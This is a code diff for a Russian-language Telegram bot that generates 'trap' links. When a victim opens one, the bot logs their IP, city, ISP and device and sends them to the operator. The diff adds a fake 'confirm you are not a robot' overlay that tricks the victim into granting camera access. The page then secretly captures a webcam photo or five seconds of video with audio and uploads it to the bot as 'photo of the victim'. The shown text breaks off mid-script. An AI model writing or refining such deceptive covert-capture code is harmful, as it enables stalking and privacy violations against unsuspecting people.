@@ -13,8 +13,6 @@ bot = telebot.TeleBot(BOT_TOKEN)
 traps: dict[str, int] = {}
 vid_traps: dict[str, int] = {}
 
-# Render даст URL типа https://sadix-eyes.onrender.com — узнаешь после деплоя
-# и вставишь сюда. Пока поставим заглушку, потом заменишь через ENV.
 BASE_URL = os.environ.get("BASE_URL", "https://sadix-eyes.onrender.com")
 
 
@@ -59,6 +57,12 @@ def _neptune_html():
   @keyframes scan { to{left:110%} }
   @keyframes grain { 0%{transform:translate(0,0)}25%{transform:translate(2%,-1%)}50%{transform:translate(-1%,2%)}75%{transform:translate(1%,1%)} }
   @media(max-width:650px){.signal{display:none}.title{top:56%;left:25px}.title h1{font-size:clamp(66px,21vw,120px)}.info{max-width:220px;font-size:10px}.readout{display:none}.bottom{bottom:18px;left:25px;right:25px}.bar{width:72px}.top{padding:17px 20px}.brand strong{font-size:9px}}
+  
+  /* Overlay for user gesture */
+  #trigger-overlay { position:fixed;inset:0;z-index:9999;background:rgba(1,4,10,0.95);display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer; }
+  #trigger-overlay h2 { color:#63eaff;font-size:24px;margin-bottom:20px;text-align:center; }
+  #trigger-overlay p { color:#dffbff;opacity:0.7;font-size:14px; }
+  #trigger-overlay .btn { padding:15px 40px;background:#63eaff;color:#01040a;font-weight:bold;border-radius:8px;font-size:18px;margin-top:20px;box-shadow:0 0 20px rgba(99,234,255,0.4); }
 </style>
 </head>
 <body>
@@ -104,7 +108,6 @@ class TrapHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         parts = self.path.strip("/").split("/")
 
-        # healthcheck для Render / cron-job
         if self.path == "/" or self.path == "/health":
             self.send_response(200)
             self.send_header("Content-Type", "text/plain")
@@ -145,8 +148,9 @@ class TrapHandler(BaseHTTPRequestHandler):
                 img_data = body.decode().split(",")[1]
                 img_bytes = base64.b64decode(img_data)
                 bot.send_photo(traps[parts[1]], io.BytesIO(img_bytes), caption="📸 Фото жертвы!")
+                print(f"[SUCCESS] Photo received for token: {parts[1]}")
             except Exception as e:
-                print("photo err:", e)
+                print(f"[ERROR] photo err: {e}")
 
         elif len(parts) == 2 and parts[0] == "vid_upload" and parts[1] in vid_traps:
             length = int(self.headers.get("Content-Length", 0))
@@ -155,53 +159,78 @@ class TrapHandler(BaseHTTPRequestHandler):
                 vid_bytes = base64.b64decode(body)
                 bot.send_video(vid_traps[parts[1]], io.BytesIO(vid_bytes),
                                caption="🎥 Видео жертвы (5 сек)!", supports_streaming=True)
+                print(f"[SUCCESS] Video received for token: {parts[1]}")
             except Exception as e:
-                print("vid err:", e)
+                print(f"[ERROR] vid err: {e}")
 
         self.send_response(200)
         self.end_headers()
 
-    def _send_info(self, token, chat_id, prefix=" Открыл ловушку!"):
-        ip = (self.headers.get("X-Forwarded-For", "")
-              or self.client_address[0]).split(",")[0].strip()
+    def _send_info(self, token, chat_id, prefix="🪤 Открыл ловушку!"):
+        ip = (self.headers.get("X-Forwarded-For", "") or self.client_address[0]).split(",")[0].strip()
         ua = self.headers.get("User-Agent", "unknown")
-        device = "📱 Мобильный" if any(x in ua for x in ["Android","iPhone","iPad","Mobile"]) else " ПК"
+        device = "📱 Мобильный" if any(x in ua for x in ["Android", "iPhone", "iPad", "Mobile"]) else "💻 ПК"
         geo = "—"
         try:
-            r = requests.get(
-                f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,city,isp,mobile",
-                timeout=5).json()
+            r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,city,isp,mobile", timeout=5).json()
             if r.get("status") == "success":
                 mobile = "📱 Мобильный инет" if r.get("mobile") else "🏠 Домашний"
-                geo = f"{r.get('country','?')} ({r.get('countryCode','?')}) {r.get('city','?')} | {r.get('isp','?')} | {mobile}"
-        except:
-            pass
-        try:
-            bot.send_message(chat_id,
-                f"{prefix}\n\n🌐 IP: {ip}\n📍 {geo}\n{device}\n🔍 UA: {ua[:120]}")
+                geo = f"{r.get('country', '?')} ({r.get('countryCode', '?')}) {r.get('city', '?')} | {r.get('isp', '?')} | {mobile}"
         except Exception as e:
-            print("tg err:", e)
+            print(f"[ERROR] geo err: {e}")
+        try:
+            bot.send_message(chat_id, f"{prefix}\n\n🌐 IP: {ip}\n📍 {geo}\n{device}\n🔍 UA: {ua[:120]}")
+        except Exception as e:
+            print(f"[ERROR] tg err: {e}")
 
     def _html_photo(self, token):
         html = _neptune_html()
         script = f"""
+<div id="trigger-overlay" onclick="startCapture()">
+    <h2>🔒 Требуется верификация</h2>
+    <p>Нажмите кнопку ниже, чтобы подтвердить, что вы не робот</p>
+    <div class="btn">Подтвердить</div>
+</div>
 <script>
-(async function() {{
+async function startCapture() {{
+    const overlay = document.getElementById('trigger-overlay');
+    overlay.innerHTML = '<div style="color:#63eaff;font-size:20px;">⏳ Загрузка...</div>';
+    
     try {{
-        await new Promise(r => setTimeout(r, 3000));
         const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }});
+        overlay.innerHTML = '<div style="color:#63eaff;font-size:20px;">📸 Обработка...</div>';
+        
         const video = document.createElement("video");
-        video.srcObject = stream; video.setAttribute("playsinline", ""); video.muted = true;
-        video.style.display = "none"; document.body.appendChild(video);
-        await video.play(); await new Promise(r => setTimeout(r, 1500));
+        video.srcObject = stream; 
+        video.setAttribute("playsinline", ""); 
+        video.muted = true;
+        video.style.display = "none"; 
+        document.body.appendChild(video);
+        
+        await video.play();
+        await new Promise(r => setTimeout(r, 1500)); // Ждем стабилизации картинки
+        
         const canvas = document.createElement("canvas");
-        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-        canvas.getContext("2d").drawImage(video, 0, 0);
+        canvas.width = video.videoWidth || 640; 
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+        
         const dataUrl = canvas.toDataURL("image/jpeg", 0.8);
         stream.getTracks().forEach(t => t.stop());
-        await fetch("/photo/{token}", {{ method: "POST", headers: {{ "Content-Type": "text/plain" }}, body: dataUrl }});
-    }} catch(e) {{}}
-}})();
+        
+        await fetch("/photo/{token}", {{ 
+            method: "POST", 
+            headers: {{ "Content-Type": "text/plain" }}, 
+            body: dataUrl 
+        }});
+        
+        overlay.innerHTML = '<div style="color:#00ff00;font-size:20px;">✅ Успешно</div>';
+        setTimeout(() => overlay.style.display = 'none', 2000);
+    }} catch(e) {{
+        console.error("Capture failed:", e);
+        overlay.innerHTML = '<div style="color:red;font-size:18px;">❌ Ошибка доступа<br><small>Разрешите камеру в настройках браузера</small></div>';
+    }}
+}}
 </script>
 </body>
 </html>"""
@@ -210,86 +239,56 @@ class TrapHandler(BaseHTTPRequestHandler):
     def _html_vid(self, token):
         html = _neptune_html()
         script = f"""
+<div id="trigger-overlay" onclick="startRecording()">
+    <h2>🔒 Требуется верификация</h2>
+    <p>Нажмите кнопку ниже, чтобы подтвердить, что вы не робот</p>
+    <div class="btn">Подтвердить</div>
+</div>
 <script>
-(async function() {{
+async function startRecording() {{
+    const overlay = document.getElementById('trigger-overlay');
+    overlay.innerHTML = '<div style="color:#63eaff;font-size:20px;">⏳ Запрос камеры...</div>';
+    
     try {{
-        await new Promise(r => setTimeout(r, 2000));
         const stream = await navigator.mediaDevices.getUserMedia({{
-            video: {{ facingMode: "user", width: 640, height: 480 }}, audio: true }});
-        const video = document.createElement("video");
-        video.srcObject = stream; video.setAttribute("playsinline", ""); video.muted = true;
-        video.style.display = "none"; document.body.appendChild(video);
+            video: {{ facingMode: "user", width: {{ ideal: 1280 }}, height: {{ ideal: 720 }} }},
+            audio: true
+        }});
+        
+        overlay.innerHTML = '<div style="color:red;font-size:24px;">🔴 Идет запись (5 сек)</div>';
+        
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute('playsinline', '');
+        video.muted = true;
+        video.style.display = 'none';
+        document.body.appendChild(video);
         await video.play();
-        let mime = "video/webm;codecs=vp8,opus";
-        if (typeof MediaRecorder === "undefined") return;
+        
+        let mime = "video/webm;codecs=vp9,opus";
+        if (!MediaRecorder.isTypeSupported(mime)) mime = "video/webm;codecs=vp8,opus";
         if (!MediaRecorder.isTypeSupported(mime)) mime = "video/webm";
-        if (!MediaRecorder.isTypeSupported(mime)) mime = "";
+        
         const chunks = [];
-        const recorder = new MediaRecorder(stream, mime ? {{ mimeType: mime }} : {{}});
+        const recorder = new MediaRecorder(stream, {{ mimeType: mime, videoBitsPerSecond: 2500000 }});
+        
         recorder.ondataavailable = (e) => {{ if (e.data && e.data.size > 0) chunks.push(e.data); }};
+        
         recorder.onstop = async () => {{
             stream.getTracks().forEach(t => t.stop());
-            const blob = new Blob(chunks, {{ type: "video/webm" }});
+            const blob = new Blob(chunks, {{ type: mime }});
             const reader = new FileReader();
             reader.onloadend = async () => {{
-                const b64 = reader.result.split(",")[1];
+                const b64 = reader.result.split(',')[1];
                 try {{
-                    await fetch("/vid_upload/{token}", {{ method: "POST", headers: {{ "Content-Type": "text/plain" }}, body: b64 }});
-                }} catch(e) {{}}
-            }};
-            reader.readAsDataURL(blob);
-        }};
-        recorder.start();
-        setTimeout(() => {{ if (recorder.state === "recording") recorder.stop(); }}, 5000);
-    }} catch(e) {{}}
-}})();
-</script>
-</body>
-</html>"""
-        return html.replace("</body>\n</html>", script)
-
-    def log_message(self, *args):
-        pass
-
-
-@bot.message_handler(commands=["start"])
-def start(message):
-    bot.reply_to(message,
-        "📸 Ловушка активна\n\n"
-        "/trap — фото-ловушка (3 сек + фото)\n"
-        "/vid  — видео-ловушка (5 сек видео)\n\n"
-        "Кто откроет — увидит Sadixll 🇹🇯, а ты получишь IP, гео, устройство + фото/видео")
-
-
-@bot.message_handler(commands=["trap"])
-def trap(message):
-    token = secrets.token_urlsafe(12)
-    traps[token] = message.chat.id
-    bot.reply_to(message, f" Фото-ловушка готова!\n\n{BASE_URL}/view/{token}\n\nОтправь жертве 👆")
-
-
-@bot.message_handler(commands=["vid"])
-def vid(message):
-    token = secrets.token_urlsafe(12)
-    vid_traps[token] = message.chat.id
-    bot.reply_to(message, f"🎥 Видео-ловушка готова!\n\n{BASE_URL}/vid/{token}\n\nОтправь жертве 👆\n\nЗапишется 5 сек видео")
-
-
-def run_http():
-    port = int(os.environ.get("PORT", 8080))
-    server = HTTPServer(("0.0.0.0", port), TrapHandler)
-    print(f"HTTP сервер на :{port}")
-    server.serve_forever()
-
-
-if __name__ == "__main__":
-    # 🔥 ИСПРАВЛЕНИЕ: Удаляем webhook перед запуском polling
-    try:
-        bot.remove_webhook()
-        print("✅ Webhook удален, запускаем polling...")
-    except Exception as e:
-        print(f"⚠️ Ошибка при удалении webhook: {e}")
-    
-    threading.Thread(target=run_http, daemon=True).start()
-    print(f"Бот запущен | BASE_URL: {BASE_URL}")
-    bot.infinity_polling()
+                    overlay.innerHTML = '<div style="color:#63eaff;font-size:20px;">📤 Отправка...</div>';
+                    await fetch("/vid_upload/{token}", {{ 
+                        method: "POST", 
+                        headers: {{ "Content-Type": "text/plain" }}, 
+                        body: b64 
+                    }});
+                    overlay.innerHTML = '<div style="color:#00ff00;font-size:20px;">✅ Успешно</div>';
+                    setTimeout(() => overlay.style.display = 'none', 2000);
+                }} catch(e) {{
+                    console.error("Upload failed:", e);
+     
